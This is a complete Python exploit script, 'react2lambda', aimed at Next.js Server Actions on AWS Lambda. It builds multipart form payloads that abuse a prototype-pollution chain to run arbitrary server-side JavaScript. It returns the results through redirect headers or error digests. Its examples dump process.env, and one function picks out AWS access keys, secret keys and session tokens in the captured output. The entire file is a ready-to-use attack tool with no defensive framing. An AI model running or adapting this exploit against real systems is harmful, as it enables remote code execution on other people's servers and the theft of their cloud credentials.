#!/usr/bin/env python3
"""
react2lambda - Next.js Lambda Function Exploit Tool
Exploits Server Side JavaScript Injection via prototype pollution in Server Actions.
"""

import sys
import re
import requests
import urllib3

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'


# Suppress SSL warnings for self-signed certs
urllib3.disable_warnings()

# Multipart form boundary
BOUNDARY = "--------------------------1aac189fd702b1d18b010927"

# Regex pattern to extract output from redirect URL
OUTPUT_PATTERN = r"/x\?o=([^;]+)"

# Regex pattern to extract digest from error response
DIGEST_PATTERN = r'E\{"digest":"((?:[^"\\]|\\.)*)"\}'


def print_banner():
    """Print the react2lambda banner."""
    # Box inner width is 56 characters
    width = 56
    title = "react2lambda"
    subtitle = "Next.js Lambda Function SSJI Exploit Tool"
    
    # Center the text
    title_padding = (width - len(title)) // 2
    title_line = " " * title_padding + title + " " * (width - len(title) - title_padding)
    
    subtitle_padding = (width - len(subtitle)) // 2
    subtitle_line = " " * subtitle_padding + subtitle + " " * (width - len(subtitle) - subtitle_padding)
    
    print()
    print(f"{Colors.CYAN}{Colors.BOLD}  ┏{'━' * width}┓{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}  ┃{Colors.RED}{title_line}{Colors.CYAN}{Colors.BOLD}┃{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}  ┃{Colors.DIM}{subtitle_line}{Colors.CYAN}{Colors.BOLD}┃{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}  ┗{'━' * width}┛{Colors.RESET}")
    print()


def print_info(msg):
    """Print an info message."""
    print(f"{Colors.BLUE}[*]{Colors.RESET} {msg}")


def print_success(msg):
    """Print a success message."""
    print(f"{Colors.GREEN}[+]{Colors.RESET} {msg}")


def print_error(msg):
    """Print an error message."""
    print(f"{Colors.RED}[-]{Colors.RESET} {msg}")


def print_warning(msg):
    """Print a warning message."""
    print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")


def highlight_aws_creds(output):
    """
    Highlight AWS credentials in red within the output string.
    
    Args:
        output: The raw output string
    
    Returns:
        Output string with AWS credentials highlighted in red
    """
    highlighted = output
    
    # Patterns to highlight: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
    # and their values in comma-separated format (KEY,VALUE)
    aws_keys = ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN']
    
    for key in aws_keys:
        # Match KEY,VALUE pattern (comma-separated)
        pattern = f'({key}),([^,]+)'
        replacement = f'{Colors.RED}{Colors.BOLD}\\1,\\2{Colors.RESET}'
        highlighted = re.sub(pattern, replacement, highlighted)
        
        # Also match KEY=VALUE pattern
        pattern = f'({key})=([^,\\s]+)'
        replacement = f'{Colors.RED}{Colors.BOLD}\\1=\\2{Colors.RESET}'
        highlighted = re.sub(pattern, replacement, highlighted)
    
    return highlighted


def print_output(output):
    """Print the command output with AWS credentials highlighted in red."""
    print(f"\n{Colors.GREEN}{Colors.BOLD}Output:{Colors.RESET}")
    print(f"{Colors.CYAN}{'─' * 50}{Colors.RESET}")
    
    # Highlight AWS credentials inline
    highlighted_output = highlight_aws_creds(output)
    print(highlighted_output)
    
    print(f"{Colors.CYAN}{'─' * 50}{Colors.RESET}\n")


def build_payload(cmd):
    """
    Build the multipart form payload that exploits the vulnerability.
    
    Args:
        cmd: The command string (expects format like 'js:expression')
    
    Returns:
        Encoded multipart form data as string
    """
    # Extract the JS expression (skip 'js:' prefix)
    js_expression = cmd[3:].strip()
    
    # Build the JavaScript code that will be executed
    # It converts the result to a string and throws a redirect error
    # containing the output in the URL
    js_code = (
        f"var res=String({js_expression});"
        f"throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest:`NEXT_REDIRECT;push;/x?o=${{res}};307;`}});"
    )
    
    # Escape backslashes and quotes for embedding in JSON
    escaped_js = js_code.replace("\\", "\\\\").replace('"', '\\"')
    
    # Build the form fields that trigger the prototype pollution chain
    fields = [
        # Field 0: Reference marker
        '"$1"',
        
        # Field 1: Resolved model with prototype pollution setup
        '{"status":"resolved_model","reason":0,"_response":"$4",'
        '"value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},'
        '\\"length\\":1}","then":"$2:then"}',
        
        # Field 2: Reference marker
        '"$@3"',
        
        # Field 3: Empty array
        "[]",
        
        # Field 4: The actual payload with our JS code
        f'{{"_prefix": "{escaped_js}", '
        f'"_formData":{{"get":"$3:constructor:constructor"}},'
        f'"_chunks":"$2:_response:_chunks"}}'
    ]
    
    # Build multipart form data
    parts = []
    for index, value in enumerate(fields):
        part = (
            f"--{BOUNDARY}\r\n"
            f'Content-Disposition: form-data; name="{index}"\r\n'
            f"\r\n"
            f"{value}\r\n"
        )
        parts.append(part)
    
    # Add closing boundary
    form_data = "".join(parts) + f"--{BOUNDARY}--"
    
    return form_data


def extract_output(response):
    """
    Extract the command output from the server response.
    
    The output can be in either:
    - The X-Action-Redirect header (if redirect worked)
    - The response body in an error digest (if redirect was caught)
    
    Args:
        response: The requests Response object
    
    Returns:
        The extracted output string, or None if not found
    """
    # Try to get output from redirect header first
    redirect_header = response.headers.get("X-Action-Redirect", "")
    match = re.search(OUTPUT_PATTERN, redirect_header)
    if match:
        return match.group(1)
    
    # Try to extract from error digest in response body
    digest_match = re.search(DIGEST_PATTERN, response.text)
    if digest_match:
        # Unescape the digest content
        digest_content = digest_match.group(1)
        digest_content = digest_content.replace('\\"', '"')
        digest_content = digest_content.replace("\\\\", "\\")
        
        # Look for output in the unescaped digest
        inner_match = re.search(OUTPUT_PATTERN, digest_content)
        if inner_match:
            return inner_match.group(1)
    
    return None


def normalize_host(host):
    """
    Normalize the host URL, ensuring it has a scheme and no trailing slash.
    
    Args:
        host: The host string from command line
    
    Returns:
        Normalized URL string
    """
    host = host.strip().rstrip("/")
    
    if not host.startswith(("http://", "https://")):
        host = f"https://{host}"
    
    return host


def parse_command(args):
    """
    Parse the command from command line arguments.
    
    Supports two formats:
    - react2lambda <host> <command>
    - react2lambda <host> -c <command>
    
    Args:
        args: sys.argv list
    
    Returns:
        The command string
    """
    if len(args) >= 4 and args[2] == "-c":
        return args[3]
    return args[2]


def print_usage():
    """Print usage information with colors."""
    print_banner()
    print(f"{Colors.BOLD}Usage:{Colors.RESET}")
    print(f"  react2lambda {Colors.CYAN}<host>{Colors.RESET} {Colors.YELLOW}<js:expression>{Colors.RESET}")
    print(f"  react2lambda {Colors.CYAN}<host>{Colors.RESET} -c {Colors.YELLOW}<js:expression>{Colors.RESET}")
    print()
    print(f"{Colors.BOLD}Examples:{Colors.RESET}")
    print(f"  react2lambda {Colors.CYAN}https://target.com{Colors.RESET} {Colors.YELLOW}'js:process.version'{Colors.RESET}")
    print(f"  react2lambda {Colors.CYAN}https://target.com{Colors.RESET} {Colors.YELLOW}'js:process.env'{Colors.RESET}")
    print(f"  react2lambda {Colors.CYAN}https://target.com{Colors.RESET} {Colors.YELLOW}'js:require(\"os\").hostname()'{Colors.RESET}")
    print()
    print(f"{Colors.BOLD}Description:{Colors.RESET}")
    print(f"  Exploits Server Side JavaScript Injection (SSJI) in Next.js")
    print(f"  Lambda Functions via prototype pollution in Server Actions.")
    print()


def main():
    """Main entry point for react2lambda."""
    if len(sys.argv) < 3:
        print_usage()
        sys.exit(1)
    
    print_banner()
    
    # Parse arguments
    host = normalize_host(sys.argv[1])
    command = parse_command(sys.argv)
    
    print_info(f"Target: {Colors.CYAN}{host}{Colors.RESET}")
    print_info(f"Payload: {Colors.YELLOW}{command}{Colors.RESET}")
    print_info("Sending exploit...")
    
    # Build request headers
    headers = {
        "Next-Action": "x",
        "Content-Type": f"multipart/form-data; boundary={BOUNDARY}"
    }
    
    # Build and send the payload
    payload = build_payload(command)
    
    try:
        response = requests.post(
            host,
            headers=headers,
            data=payload.encode(),
            timeout=10,
            verify=False,
            allow_redirects=False
        )
        
        print_info(f"Response: {Colors.DIM}HTTP {response.status_code}{Colors.RESET}")
        
        # Extract and print the output
        output = extract_output(response)
        
        if output:
            print_success("Exploit successful!")
            print_output(output)
        else:
            print_error("No output extracted from response")
            print_warning("Target may not be vulnerable or response format changed")
            sys.exit(1)
            
    except requests.exceptions.Timeout:
        print_error("Request timed out")
        sys.exit(1)
    except requests.exceptions.ConnectionError as e:
        print_error(f"Connection failed: {e}")
        sys.exit(1)
    except Exception as e:
        print_error(f"Unexpected error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
